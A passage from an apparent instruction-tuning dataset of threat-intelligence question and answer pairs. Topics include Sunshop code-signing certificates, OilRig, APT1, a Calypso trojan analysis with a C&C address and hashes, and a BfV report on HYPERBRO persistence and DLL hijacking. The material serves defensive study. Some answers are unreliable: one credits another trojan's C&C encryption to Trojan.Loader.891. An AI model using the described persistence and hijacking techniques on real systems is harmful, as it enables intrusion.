bit):\n00:ad:12:17:ee:5a:5a:a7:9f:ee:60:08:58:30:8d:\n5d:2d:90:c6:ed:fd:20:53:7b:fe:23:44:77:4b:a9:\n25:ca:b0:5d:d6:c8:3a:e5:1f:a5:bb:7e:f4:65:75:\nc7:2c:34:4e:4f:ea:a0:43:1f:10:ee:97:e8:7c:0e:\n83:f6:09:ab:90:d0:5e:0b:36:2e:eb:7a:39:2c:fa:\n7f:1a:b8:9d:5d:2e:3b:24:71:4a:3b:0a:a9:46:e1:                  8e:28:a6:85:9c:da:52:f1:b0:6e:57:6f:24:81:bf:\ncf:36:1b:5a:95:d7:35:cb:c9:61:56:ac:3c:e4:cd:\n73:66:a2:42:2a:32:ea:52:cc:c7:ab:9b:63:4e:a2:\n77:d7:aa:6b:7f:14:25:15:e6:b6:f0:54:68:41:d2:\n54:74:41:0b:6e:b8:fa:ac:22:26:94:2a:b7:2e:ce:\n18:5e:9b:1d:0a:d1:bd:f1:b8:5a:39:b4:3e:21:1b:\neb:ce:9b:3d:34:0f:19:fd:b3:b8:2e:13:53:80:2d:\n29:af:14:bf:33:62:d8:68:b4:3f:02:98:26:bb:d5:\nb7:69:cf:9c:f5:8a:bc:45:fd:7f:51:fa:5f:b9:33:                  fe:62:2c:cc:fc:43:34:7e:e8:9a:c0:2c:17:8c:25:                  c8:48:45:08:9f:4f:04:ce:54:c6:51:cc:3e:54:a0:                  6a:cd\nExponent: 65537 (0x10001)\nX509v3 extensions:\nX509v3 Authority Key Identifier:               keyid:A4:13:6A:3F:10:0B:D7:21:87:D4:8B:05:CA:BC:B1:02:CD:54:E2:8A\nX509v3 Subject Key Identifier:\nCB:DD:A1:49:1B:B3:17:85:BB:B1:A0:2D:33:18:82:39:9A:7B:CA:6F\nX509v3 Key Usage: critical\nDigital Signature\nX509v3 Basic Constraints: critical              CA:FALSE\nX509v3 Extended Key Usage:\nCode Signing, Microsoft Commercial Code Signing         X509v3 Certificate Policies:\nPolicy: 1.3.6.1.4.1.6449.1.2.2.22\nCPS: http://www.wosign.com/cps/\nX509v3 CRL Distribution Points:\nURI:http://crl.wosign.com/WoSignCodeSigning.crl\nAuthority Information Access:\nCA Issuers - URI:http://crt.wosign.com/WoSignCodeSigning.crt\nSignature Algorithm: sha1WithRSAEncryption\n8d:89:24:cc:ea:3f:23:af:01:46:59:24:43:22:67:b3:27:74:      84:fc:ae:ea:03:bc:09:b5:f0:88:8a:13:01:d3:4f:d7:a9:01:      c3:4c:5e:46:02:b5:46:e3:25:02:fc:f9:e3:f6:41:79:fa:18:      c5:0f:96:06:78:db:ed:51:35:55:4b:d2:b3:07:11:13:f2:a9:      75:99:5e:ac:67:6a:3c:9f:a6:73:8a:4b:f4:ac:8c:a2:6b:e4:      d6:a2:00:46:a5:73:11:d7:ca:e5:99:cd:68:b0:e3:ff:76:36:      f4:62:a5:71:73:0c:cc:a5:79:e4:54:a2:7b:25:de:72:6b:0d:      67:ba:43:ec:98:26:da:bc:6a:bd:7e:29:c9:d2:75:b7:ac:6d:      c9:d1:3b:e0:ef:9d:e9:1e:4a:17:fd:bd:81:6e:96:1e:13:f9:      7a:bf:66:ae:6b:7d:55:be:ce:71:0c:b7:e8:fd:da:72:58:fb:      0c:8b:d0:ec:6e:35:f3:be:02:cb:c1:40:8b:94:1d:24:32:8a:      d7:84:fd:94:66:a2:65:7c:ca:f9:c1:27:b7:53:42:14:47:1a:      97:91:6f:87:e5:a5:02:63:69:79:9b:e2:a6:1c:67:eb:f4:ac:      42:91:47:79:51:fe:20:df:4a:49:b4:b2:a1:78:1f:22:60:0d:      0f:ca:b4:6e\nCertificate:\nData:\nVersion: 3 (0x2)\nSerial Number:\n37:3e:80:24:1c:d2:98:b0:4e:85:24:62:41:42:13:fc\nSignature Algorithm: md5WithRSAEncryption\nIssuer: CN=Root Agency\nValidity\nNot Before: Feb 21 06:00:46 2013 GMT\nNot After : Dec 31 23:59:59 2039 GMT\nSubject: O=T\\x09ye[\\x89l\\xF0/emailAddress=John-hotmail-com, CN=Facesun.cn\nSubject Public Key Info:\nPublic Key Algorithm: rsaEncryption\nRSA Public Key: (1024 bit)\nModulus (1024 bit):\n00:c4:dc:fb:70:09:61:88:95:a5:1a:dd:c9:5c:dd:\nc5:5b:3c:42:1a:f4:34:38:fc:ae:25:45:d6:ce:c3:\na1:bd:60:e6:2d:34:1d:be:b3:12:66:ac:51:76:ce:\n3f:fc:04:18:21:65:ef:f4:6f:8d:ea:a2:2e:bb:d4:\n9e:05:ba:48:02:e7:05:2e:46:d2:26:db:ca:68:c8:\nec:be:cf:0a:6f:21:e0:bf:dd:bf:c9:a3:cc:4c:1d:\n5a:47:a9:e9:8f:36:43:ab:b6:95:40:04:5f:9f:5c:\n12:f2:18:88:b5:ae:1c:52:2b:3f:2c:0b:fd:29:d2:\nc6:de:1b:e3:89:8c:b1:2d:29\nExponent: 65537 (0x10001)\nX509v3 extensions:\n2.5.29.1:\n0>.....-...O..a!..dc..0.1.0...U....Root Agency...7l...d......\\5.\nSignature Algorithm: md5WithRSAEncryption\n34:1b:5f:c7:3c:a1:69:f3:3b:f3:9f:8d:09:1b:10:6a:8f:02:\n00:28:7d:45:33:a0:2e:1b:70:d4:a4:5a:a3:85:a7:c6:35:4c:\n31:6e:10:4b:91:48:4a:3d:1a:2c:cc:86:c4:e0:bd:2a:44:d7:\n94:9b:9e:e6:71:1e:b8:58:32:15\nCertificate:      Data:\nVersion: 3 (0x2)\nSerial Number:\n97e:45:f7:bc:62:39:59:91:4f:5b:84:fa:b0:97:ba:b8\nSignature Algorithm: sha1WithRSAEncryption\nIssuer: C=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=Terms of use at https://www.verisign.com/rpa (c)04, CN=VeriSign Class 3 Code Signing 2004 CA           Validity\nNot Before: Apr 16 00:00:00 2009 GMT\nNot After : Apr 18 23:59:59 2012 GMT\nSubject: C=CN, ST=Beijing, L=Beijing, O=SINA.COM TECHNOLOGY (CHINA) CO. LTD, OU=Digital ID Class 3 - Microsoft Software Validation v2, CN=SINA.COM TECHNOLOGY (CHINA) CO. LTD\nSubject Public Key Info:\nPublic Key Algorithm: rsaEncryption\nRSA Public Key: (1024 bit)\nModulus (1024 bit):\n00:ca:3f:cd:e7:f4:9d:19:fe:83:92:15:2c:06:8e:\n4c:ff:7a:8d:17:0c:94:e8:3c:25:c1:c2:ed:d5:22:\n87:b7:3c:81:c5:96:f1:94:cd:ef:19:c8:ce:13:85:\n27:c4:75:af:f1:54:71:d5:2d:4b:7b:de:3c:ac:10:\ne0:68:16:d5:7c:55:3f:02:ff:84:5e:31:c9:47:69:\n3e:d9:e1:dc:50:b2:ef:04:8d:da:02:25:cb:57:96:\n6b:e9:fe:b3:d8:db:0f:6c:c7:e8:80:db:92:ac:5b:\n6f:76:99:dd:13:70:92:d8:93:f2:53:16:5b:00:b1:\na7:99:d2:3c:38:4f:4e:d9:43\nExponent: 65537 (0x10001)\nX509v3 extensions:\nX509v3 Basic Constraints:\nCA:FALSE\nX509v3 Key Usage: critical\nDigital Signature\nX509v3 CRL Distribution Points:\nURI:http://CSC3-2004-crl.verisign.com/CSC3-2004.crl\nX509v3 Certificate Policies:\nPolicy: 2.16.840.1.113733.1.7.23.3\nCPS: https://www.verisign.com/rpa\nX509v3 Extended Key Usage:\nCode Signing\nAuthority Information Access:\nOCSP - URI:http://ocsp.verisign.com\nCA Issuers - URI:http://CSC3-2004-aia.verisign.com/CSC3-2004-aia.cer\nX509v3 Authority Key Identifier:                    keyid:08:F5:51:E8:FB:FE:3D:3D:64:36:7C:68:CF:5B:78:A8:DF:B9:C5:37\nNetscape Cert Type:\nObject Signing\n1.3.6.1.4.1.311.2.1.27:\n0.......\nSignature Algorithm: sha1WithRSAEncryption        bc:99:88:52:b3:26:a3:af:b4:09:83:4e:c2:4b:91:86:6c:e4:\n50:9a:eb:27:cb:6a:e9:77:4f:b8:c3:42:0b:1d:1a:3b:21:ed:\n09:32:67:62:1a:89:86:01:55:0b:44:01:75:d9:17:59:98:0c:\n5a:2d:09:33:f5:cd:e7:ba:f4:a3:04:0a:05:40:38:6a:7f:c5:       bb:82:aa:0b:ae:3a:b0:78:27:6b:3a:f7:d9:ba:c7:1a:13:e3:       1d:ee:c9:b8:c7:54:c5:46:e4:8a:97:c6:07:11:45:0a:57:85:       7c:ab:35:7b:5d:45:0b:3f:84:c6:32:43:7a:06:aa:48:52:d0:       16:23:74:d0:e1:6d:2c:42:d1:bb:cf:f5:70:ca:27:8e:69:35:       cc:72:b1:2d:dd:b1:9a:d1:f7:65:37:45:2e:36:c9:fd:9c:67:       87:b6:50:f8:e9:3f:86:a0:c6:3e:3f:66:6e:0e:de:fb:dc:67:       d6:29:f0:25:5b:2d:53:92:cf:07:70:50:38:3c:04:34:57:19:       59:23:09:eb:44:fe:5b:40:a3:ae:ed:5f:1a:84:80:00:ab:b8:       2a:1f:da:ef:02:46:23:b4:1e:d1:6a:90:86:9c:12:af:13:b1:       59:63:b9:47:09:d8:ad:8a:c8:66:38:3c:44:a0:37:b4:27:9c:       f5:ed:61:62\nCertificate:\nData:\nVersion: 3 (0x2)\nSerial Number:\n61:46:9e:cb:00:04:00:00:00:65\nSignature Algorithm: sha1WithRSAEncryption\nIssuer: C=US, ST=Washington, L=Redmond, O=Microsoft Corporation,\nOU=Copyright (c) 2000 Microsoft Corp., CN=Microsoft Code Signing PCA       Validity\nNot Before: Apr 4 19:43:46 2006 GMT\nNot After : Oct 4 19:53:46 2007 GMT\nSubject: C=US, ST=Washington, L=Redmond, O=Microsoft Corporation,\nCN=Microsoft Corporation\nSubject Public Key Info:\nPublic Key Algorithm: rsaEncryption\nRSA Public Key: (2048 bit)\nModulus (2048 bit):\n00:cd:81:96:38:ae:5c:a2:f2:c1:df:de:d0:ab:95:                    8d:d6:3c:9d:1f:8b:c3:5d:86:2e:5d:f0:b1:72:f5:                    ab:ac:88:6a:b5:da:b1:22:7b:0b:c8:c8:a5:4b:91:                    5e:22:13:e9:f9:f5:23:9d:b5:f4:6e:76:ae:ef:ee:                    81:61:79:a1:62:f4:6e:88:95:d0:6e:dd:c7:9f:d2:                    a4:51:11:76:61:ba:70:8a:65:a1:96:16:89:a7:5d:                    81:d0:44:66:e5:db:56:9e:40:ca:fc:dc:76:24:2e:                    44:30:00:e5:d6:7d:7b:95:11:d5:58:1d:a3:e8:4f:                    0b:c9:88:dc:a2:d6:53:99:6c:ca:63:ca:99:6a:9a:                    92:5e:4c:4d:11:e8:2f:d3:5b:5b:5e:5f:52:a3:73:                    2d:a5:bb:84:45:0d:8c:19:15:76:cb:08:da:9a:a6:                    70:15:e8:4d:ec:69:fd:5d:b2:6b:8f:ed:29:51:37:                    38:8b:c6:46:49:15:94:50:98:b0:f4:68:a4:d7:de:                    09:71:67:74:9e:77:8c:1d:85:6b:97:ea:e7:5f:45:                    cc:e0:e6:71:0d:d1:63:00:93:7b:31:98:8e:0b:b4:\n13:bd:b3:d0:ee:f1:df:21:ee:a9:60:61:ee:37:43:\n3d:c3\nExponent: 65537 (0x10001)\nX509v3 extensions:\nX509v3 Key Usage: critical\nDigital Signature, Non Repudiation\nX509v3 Subject Key Identifier:\nEE:D9:6B:A9:75:53:CD:4F:EE:1B:4E:19:06:1E:A3:9C:AB:CF:94:FD            X509v3 Extended Key Usage:\nCode Signing\n\nBased on the above text, answer a question. Analyze the 'Signature Algorithm' used in the digital certificates associated with the Sunshop campaign. What are the potential vulnerabilities or weaknesses in these algorithms, and how can cybersecurity experts address them?",
    "output": "The digital certificates associated with the Sunshop campaign primarily use the 'sha1WithRSAEncryption' signature algorithm, with one instance using 'md5WithRSAEncryption'. Both SHA-1 and MD5 are considered weak by modern cryptographic standards due to their susceptibility to collision attacks. This means that attackers could potentially generate valid signatures without possessing the private key, undermining the integrity of the certificates. Cybersecurity experts can address these vulnerabilities by enforcing the use of stronger hash functions, such as SHA-256 or SHA-3, and ensuring that all systems and applications reject certificates signed with outdated algorithms. Regular audits and updates to cryptographic policies are essential to maintain robust security postures.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the OilRig threat group utilize scheduled tasks to maintain persistence and execute malicious code in their attacks?",
    "output": "Scheduled tasks are a common mechanism used by adversaries to execute malicious code at system startup or on a scheduled basis for persistence. In the case of the OilRig threat group, they utilize scheduled tasks to execute their custom Trojan, ALMA Communicator, every two minutes with the command line argument 'Lock'. The scheduled task is created programmatically using the Schedule.Service object, which is a departure from their previous methods of creating scheduled tasks via the schtask application. This allows the Trojan to maintain persistence and continue to communicate with the command and control (C2) server even after the initial infection. Furthermore, the use of scheduled tasks enables the threat actors to execute the Trojan under the context of a specified account, potentially masking its execution under a trusted system process. The limitations of ALMA Communicator's C2 channel, which can only send 10 bytes of data at a time, may also be mitigated by the use of scheduled tasks, allowing the threat actors to exfiltrate larger files over time.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does APT1's geographic and industry focus indicate the breadth of its cyber espionage campaign?",
    "output": "APT1's geographic and industry focus indicates the breadth of its cyber espionage campaign through several observations. Firstly, 87% of APT1's victims are headquartered in countries where English is the native language, reflecting the group's proficiency in English. Secondly, APT1 targets a wide range of industries simultaneously, demonstrating significant personnel and technical resources. For instance, in January 2011, APT1 compromised 17 new victims across 10 different industries while maintaining access to previously compromised networks. Additionally, APT1 has targeted industries aligned with China's strategic priorities, including those identified in its 12th Five Year Plan, further highlighting the comprehensive nature of its operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Operating principle\nIn the beginning, the trojan decrypts the C&C server's IP addresses and ports using the XOR operation:\nDecryption result:\nC&C server\u2014159.65.157.100:443\nCommunication with it occurs using sockets:\nDepending on the time, the connection to the required C&C server will be selected:\nThe trojan creates file tmp.0 in folder %tmp%, that it use as log.\nCollect information about the system:\nTrojan.DownLoader43.44599 pushes each value onto a stack before encrypting and sending the collected data. The transferred data looks as follows:\nTo encrypt the information collected about the system, the AES128 algorithm is used in CBC mode.\nThe key and initialization vector are embedded inside:\nThe decryption method looks as follows:\nThe command execution cycle received from the C&C server:\nTable of commands compiled from the results of this cycle:\nSmall Headline: Operating principle\nThe trojan folder contains the following files:\n\u00b7 McUiCfg.dll \u2014 downloader\n\u00b7 mscuicfg.dat \u2014 encrypted shellcode\n\u00b7 mcupdui.ini \u2014 configuration of trojan\nTo move to the main malicious functionality, the trojan modifies the process memory:\nThe instruction following the malicious library's download library is modified:\nTrojan.Loader.891 finds all the functions it needs by hashes using the PEB (Process Environment Block) structure.\nAt the same time, the names of libraries and functions are hashed differently: library names are hashed as Unicode strings converted to upper case. Function names are hashed as ASCII strings without changing the case. The resulting two hashes are added together and then compared with the desired one.\nTrojan's main functions are encrypted. When the function is called, it decrypts its code, and when it exits, it encrypts it back.\nMain function:\nTrojan.Loader.891 obtains the MAC addresses of all network interfaces on the computer. The trojan then reads data from the mscuicfg.dat file. If the last 6 bytes are zero, then it writes the first MAC address from the list into them and encrypts this file with the RC4 algorithm. In this\ncase, the key is equal to the MAC address written to the file, so the encrypted data is saved to the file mscuicfg.dat.\nAfter that, in any way, the trojan reads the file again, sorting through each of the received MAC addresses until it finds the right one. The decryption's correctness is checked by matching the last 6 decrypted bytes with the encryption key. Upon successful decryption, the trojan cuts them off and decrypts the file again using the RC4 algorithm, but takes the string mscuicfg.dat as the key. The received data is a shellcode with a configuration and a payload.\nSmall Headline: Shellcode\nThe shellcode is obfuscated with a lot of JMP instructions and each value is computed with a lot of SUB, ADD, and XOR operations:\nThe shellcode's principle is to decrypt the payload and load it into memory for execution.\nThe last DWORD of the shellcode contains the OFFSET before the start of the payload.\nEncrypted data at this stage:\nFor decryption, XOR with a dynamic key is used:\nThe decrypted data contains an MZPE file with signatures replaced:\nThe decoded module is BackDoor.Whitebird.30. In addition, the module overlay contains an encrypted configuration and a module for bypassing UAC:\nSmall Headline: Operating principle\nAfter loading from the main module (msrers.exe) using the LoadLibraryW function, the trojan loads the kernel32.dll library using the LoadLibraryA. Then, it gets the address of the exported function GetModuleFileNameA:\nIt then obtains the name of the main module using the previously obtained function GetModuleFileNameA. It checks if the name contains the substring \"ers.\" (msrers.exe):\nFrom the hash, 0xEF64A41E gets the function VirtualProtect to change the memory access rights to PAGE_EXECUTE_READWRITE at 0x416362 (msrers.exe):\nThe following fragment will modify the code at 0x416362 (msrers.exe):\nPlace in the main module to be modified:\nNext, a function is called that receives the base kernel32.dll, and the addresses of the functions by hashes.\nScript to get a function by hash:\nReceived features:\nIn the following, the below structure is used to call these functions:\nTrojan takes the name dll (TmDbgLog.dll) and adds the \".TSC\" extension to it. Next, it opens the file TmDbgLog.dll.TSC for reading and decrypts its contents, which turns out to be a shellcode.\nAfter decrypting the shellcode (TmDbgLog.dll), the trojan starts executing it:\nThe below is how the script for decrypting the shellcode looks like:\nBefore decrypting and running the payload, the shellcode assembles the following structure:\nThis is what the encrypted config looks like:\nThe config's decryption will be done directly in the payload:\nAnd it'll look like this:\nEncrypted payload:\nScript to decrypt the payload:\nAfter decrypting the payload, the shellcode transfers control to the trojan, with the previously assembled structure st_mw acting as one of the parameters:\nFurther, the trojan works in the same way as the backdoor .\nMedium Headline: SHA1 hashes\nTrojan.Loader.889\nf783fc5d3fc3f923c2b99ef3a15a38a015e2735a: McUiCfg.dll\nTrojan.Loader.890\n65f64cc7aaff29d4e62520afa83b621465a79823: SRVCON.OCX 8b9e60735344f91146627213bd13c967c975a783: CLNTCON.OCX 84d5f015d8b095d24738e45d2e541989e6221786: sti.dll 3d8a3fcfa2584c8b598836efb08e0c749d4c4aab: iviewers.dll\nTrojan.Loader.891\n595b5a7f25834df7a4af757a6f1c2838eea09f7b: McUiCfg.dll\nTrojan.Loader.893\n46e999d88b76cae484455e568c2d39ad7c99e79f: McUiCfg.dll\nTrojan.Loader.894\nb1041acbe71d46891381f3834c387049cbbb0806: iviewers.dll\nTrojan.Loader.895\n635e3cf8fc165a3595bb9e25030875f94affe40f: McUiCfg.dll\nTrojan.Loader.896\nff82dcadb969307f93d73bbed1b1f46233da762f: TmDbgLog.dll\nTrojan.Loader.898\n429357f91dfa514380f06ca014d3801e3175894d: CLNTCON.OCX\nTrojan.Loader.899\ncc5bce8c91331f198bb080d364aed1d3301bfb0c: LDVPTASK.OCX\nBackDoor.PlugX.93\na8bff99e1ea76d3de660ffdbd78ad04f81a8c659: CLNTCON.OCX\nBackDoor.PlugX.94\n5a171b55b644188d81218d3f469cf0500f966bac\nBackDoor.PlugX.95\nb3ecb0ac5bebc87a3e31adc82fb6b8cc4fb66d63: netcfg.dll\nBackDoor.PlugX.96\na3347d3dc5e7c3502d3832ce3a7dd0fc72e6ea49\nBackDoor.PlugX.97\n36624dc9cd88540c67826d10b34bf09f46809da7\nBackDoor.PlugX.100\n16728655e5e91a46b16c3fe126d4d18054a570a1\nBackDoor.Whitebird.30\nabfd737b14413a7c6a21c8757aeb6e151701626a a5829ed81f59bebf35ffde10928c4bc54cadc93b\nTrojan.Siggen12.35113\n4f0ea31a363cfe0d2bbb4a0b4c5d558a87d8683e: rapi.dll\nTrojan.Uacbypass.21\n20ad53e4bc4826dadb0da7d6fb86dd38f1d13255\nProgram.RemoteAdmin.877\n23873bf2670cf64c2440058130548d4e4da412dd: AkavMiqo.exe\nTool.Frp\na6e9f5d8295d67ff0a5608bb45b8ba45a671d84c: firefox.exe 39c5459c920e7c0a325e053116713bfd8bc5ddaf: firefox.exe\n\nHow does the Calypso APT group's Trojan.Loader.891 ensure secure communication with its Command and Control (C&C) server? Explain the encryption and decryption processes involved.",
    "output": "A: The Calypso APT group's Trojan.Loader.891 ensures secure communication with its C&C server through a series of encryption and decryption processes. Initially, the trojan decrypts the C&C server's IP addresses and ports using the XOR operation. Communication with the C&C server occurs via sockets, with the connection to the required server being selected based on the time. To collect information about the system, the trojan pushes each value onto a stack before encrypting and sending the collected data. The AES128 algorithm in CBC mode is used for encrypting the information collected about the system. The key and initialization vector are embedded within the trojan. The decryption method involves reversing the AES128 encryption using the same key and initialization vector.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Hintergrundinformationen\nDie Cyberspionagegruppierung APT27 ist seit mindestens 2010 aktiv. Gegenw\u00e4rtig beobachtet das BfV eine Zunahme von Angriffen gegen deutsche Ziele durch die Gruppierung unter Verwendung der HYPERBRO-Schadsoftware.\nDas BfV geht von einer anhaltenden Angriffswelle durch den Akteur auf die deutsche Wirtschaft aus und ver\u00f6ffentlicht daher die angeh\u00e4ngten Detektionsregeln und technische Indikatoren (Indicators of Compromise), um Wirtschaftsunternehmen die Identifikation bestehender Infektionen mit den derzeit kursierenden und m\u00f6glicherweise neuen Versionen der Schadsoftware zu erm\u00f6glichen. Au\u00dferdem wird im Folgenden die Funktionsweise von HYPERBRO am Beispiel einer aktuellen Variante dargestellt.\nBig Headline: Technische Analyse\nBei HYPERBRO handelt es sich um ein Remote-Access-Tool (RAT), das in der Regel aus den folgenden Komponenten besteht (siehe Abb. 1):\nAbbildung 1: Komponenten von HYPERBRO\n1. Legitime Executable2 (msmpeng.exe oder vfhost.exe) - in diesem Fall die legitime Software Cy-berArk Viewfinity, die mit einem validen, aber abgelaufenem Zertifikat signiert ist.\n2. Maliz\u00f6se DLL3 (vftrace.dll), die durch den legitimen Loader per DLL-Hijacking4 Methode ge-laden wird.\n3. Malware Payload (thumb.dat) im Bin\u00e4rformat ausf\u00fchrbarer Programme (PE-Dateien), der ausf\u00fchrbaren Shellcode, eine malizi\u00f6se DLL sowie Informationen \u00fcber die Angriffsinfrastruktur (C2-Adressen) beinhaltet.\n4. Bei Ausf\u00fchrung des Payloads, wird weiterhin eine Malware Konfigurationsdatei (config.ini) als Datei im Ordner abgelegt.\nBig Headline: Installationsprozess\nDer Installationsprozess von HYPERBRO l\u00e4uft wie folgt ab (siehe Abb. 2):\nAbbildung 2: Installationsprozess von HYPERBRO\n2 Als Loader bezeichnet man eine der ersten Stufe einer mehrstufigen Malware, die die malizi\u00f6sen Bestandteile der Schadsoftware ggf. dekodiert und ausf\u00fchrt. Loader k\u00f6nnen dabei teils auf legitimen Programmen basieren, die vom Angreifer entgegen ihres eigentlichen Einsatzzweckes zum Laden von Schadprogrammen missbraucht werden.\n3 Bei einer DLL (Dynamic Link Library) handelt es sich um eine Programmbibliothek (meist in einem Windowssystem) aus der Softwareprogramme dynamisch Daten, Ressourcen oder Funktionalit\u00e4ten nachladen k\u00f6nnen.\n4 DLL-Hijacking bezeichnet das Laden einer DLL aus einem vom Programmentwickler nicht vorgesehenen Pfad. Sofern keine vollst\u00e4ndige Pfadangabe zum Laden der DLL in einer Software hinterlegt ist, wird unter Windows standardm\u00e4\u00dfig zuerst in dem Ordner gesucht, in welchem das Programm selbst liegt, dann in bestimmten Windows-Ordnern. Legt ein Angreifer eine malizi\u00f6se DLL in einem Ordner ab, der vor dem Ordner der eigentlich zu ladenden DLL durchsucht wird, l\u00e4dt ein legitimes Programm die malizi\u00f6se DLL und f\u00fchrt diese damit aus.\nBei der initialen Ausf\u00fchrung der legitimen Executable (msmpeng.exe / vfhost.exe) wird die malizi\u00f6se DLL (vftrace.dll) per (1.) DLL-Hijacking geladen. Die malizi\u00f6se DLL (2.) l\u00e4dt und decodiert daraufhin den Malware Payload (thumb.dat). Die DLL und der Payload sind dabei stark obfuskiert und nutzen Anti-Debugging-Techniken, um die Analyse zu erschweren. Der decodierte Payload enth\u00e4lt Shell-code sowie eine komprimierte DLL, die (3.) vom Shellcode dekomprimiert und in memory geladen wird. Diese DLL (4.) pr\u00fcft daraufhin von welchem Ablageort HYPERBRO gestartet wurde \u2013 i.d.R. befindet sie sich zu diesem Zeitpunkt noch an einem zuf\u00e4lligen, durch den Akteur gew\u00e4hlten Ablageort. Weiterhin wird \u00fcberpr\u00fcft ob HYPERBRO mit administrativen Rechten gestartet wurde: Ist das der Fall (4.a) werden alle HYPERBRO-Dateien in den folgenden Ordner verschoben bzw. kopiert, um die Software Windows Defender zu imitieren:\n%ProgramFiles%\\Common Files\\windefenders\\\nIn diesen Ordner kann nur mit administrativen Rechten geschrieben werden.\nWurde HYPERBRO ohne administrative Rechte gestartet, (4.b) wird die Schadsoftware hingegen in den folgenden Ordner verschoben:\n%ProgramData%\\windefenders\\\nDurch die Verschiebung in diesen Ordner imitiert HYPERBRO ebenfalls die Software Windows Defender. Anschlie\u00dfend (5.) startet sich HYPERBRO am neuen Ablageort selbst neu. Dazu kommt Process Hollowing (in svchost.exe) zum Einsatz und unter Umst\u00e4nden auch die Erstellung eines tempor\u00e4ren Services, um die Ausf\u00fchrung mit lokalen Systemrechten zu erm\u00f6glichen (in manchen HYPERBRO-Varianten).\nBig Headline: Ausf\u00fchrungsprozess\nDie erneute Ausf\u00fchrung von HYPERBRO (nach Installation oder bei jedem Systemneustart) l\u00e4uft in den ersten drei Schritten genauso ab, wie bei der Installation (siehe Abb. 3):\nAbbildung 3: Ausf\u00fchrungsprozess von HYPERBRO\nBei der Ausf\u00fchrung der legitimen Executable (msmpeng.exe / vfhost.exe) wird die malizi\u00f6se DLL (vftrace.dll) per (1.) DLL-Hijacking geladen. Die malizi\u00f6se DLL (2.) l\u00e4dt und decodiert daraufhin den Malware Payload (thumb.dat). Der decodierte Payload enth\u00e4lt Shellcode sowie die komprimierte DLL, die (3.) vom Shellcode dekomprimiert und geladen wird. Diese DLL (4.) pr\u00fcft daraufhin erneut von welchem Ablageort HYPERBRO gestartet wurde \u2013 dieses Mal identifiziert die DLL jedoch, dass HYPERBRO aus dem finalen Ablageort heraus gestartet wurde (%ProgramFiles%\\Common Files\\ windefenders\\ oder %ProgramData%\\windefenders\\). Ebenfalls wird erneut gepr\u00fcft, ob HYPERBRO mit administrativen Rechten gestartet wurde. Daraufhin wird ein Persistenzmechanismus eingerichtet. Ein Service (windefenders) (4.a), falls das Programm mit administrativen Rechten gestartet wurde (Anzeigename \"Windows Defenders\") und ein Registry Key (4.b) (HKEY_CURRENT_USER\\Software\\ Microsoft\\Windows\\CurrentVersion\\Run\\windefenders), falls ohne administrative Rechte gestartet wurde. Zudem wird ein Mutex erstellt, das eine Mehrfachinfektion verhindert. Au\u00dferdem wird eine (6.) Malware Konfigurationsdatei (config.ini) im Ordner abgelegt. Die Konfigurationsdatei (config. ini) beinhaltet die zuf\u00e4llig generierte GUID5 von HYPERBRO, die bei der C2-Kommunikation mit\n\u00fcbermittelt wird. Zuletzt (7.) wird die malizi\u00f6se DLL per Process Hollowing in einen neuen Prozess svchost.exe-Pozess geladen.\n5 GUID: Globally Unique Identifiier ist eine Zahl mit 128 Bit (16 Bytes), die im vorliegenden Fall genutzt wird um eine bestimmte Malware-Instanz bzw. ein kompromittiertes Opfer zu identifizieren.\nHYPERBRO kann in Memory bei Bedarf (8.) noch weitere Prozesse starten, um bestimmte Funktionalit\u00e4ten (wie bspw. Key-Logging) zu erm\u00f6glichen. Diese optionalen Worker Prozesse kommunizieren via einer Named Pipe (\\\\.\\pipe\\testpipe) mit dem urspr\u00fcnglichen Daemon Prozess (siehe Abb. 4).\nAbbildung 4: Ausf\u00fchrungsprozess von HYPERBRO in Memory\n\nBased on the above text, answer a question. Explain the role of the configuration file (config.ini) in the operation of HYPERBRO. What information does it contain and how is it utilized during the communication with the Command and Control (C2) server?",
    "output": "The configuration file (config.ini) plays a crucial role in the operation of HYPERBRO. It contains a randomly generated Global Unique Identifier (GUID), which is a 128-bit number used to identify a specific instance of the malware or a compromised victim. This GUID is transmitted during the communication with the Command and Control (C2) server. The configuration file is stored in the directory where HYPERBRO is installed. The GUID serves as a unique identifier for the infected system, allowing the attackers to track and manage the compromised host effectively. This ensures that the C2 server can distinguish between different instances of the malware, facilitating targeted commands and data exfiltration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Background\nThe Republic of Artsakh, also known as the Nagorno-Karabakh Republic, is a breakaway region in the South Caucasus with a majority ethnic Armenian population but is recognized internationally as part of Azerbaijan. It is a de facto enclave within Azerbaijan, with the only land route to Armenia through the Lachin corridor, which has been under the control of Russian peacekeepers since the end of the Second Nagorno-Karabakh War in 2020.\nThe situation in Artsakh is tense, with frequent ceasefire violations and sporadic outbreaks of violence. For more than two decades, this unresolved highly militarized ethno-nationalist territorial conflict continues to be a source of tension between Armenia and Azerbaijan.\nFigure 1 \u2013 Map of the conflict over Nagorno-Karabakh (Artsakh). Source: .\n\nQ: How does the geopolitical context of the Nagorno-Karabakh conflict influence the cybersecurity landscape in the region, particularly in relation to Operation Silent Watch?",
    "output": "A: The geopolitical context of the Nagorno-Karabakh conflict significantly influences the cybersecurity landscape due to the ongoing tensions between Armenia and Azerbaijan. The Republic of Artsakh, also known as the Nagorno-Karabakh Republic, is a breakaway region with a majority ethnic Armenian population but is internationally recognized as part of Azerbaijan. This unresolved, highly militarized ethno-nationalist territorial conflict has led to frequent ceasefire violations and sporadic outbreaks of violence. The only land route to Armenia is through the Lachin corridor, controlled by Russian peacekeepers since the end of the Second Nagorno-Karabakh War in 2020. This tense situation creates an environment where cyber operations, such as those seen in Operation Silent Watch, can be used as tools for surveillance, espionage, and potentially disruptive activities, further exacerbating the conflict.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
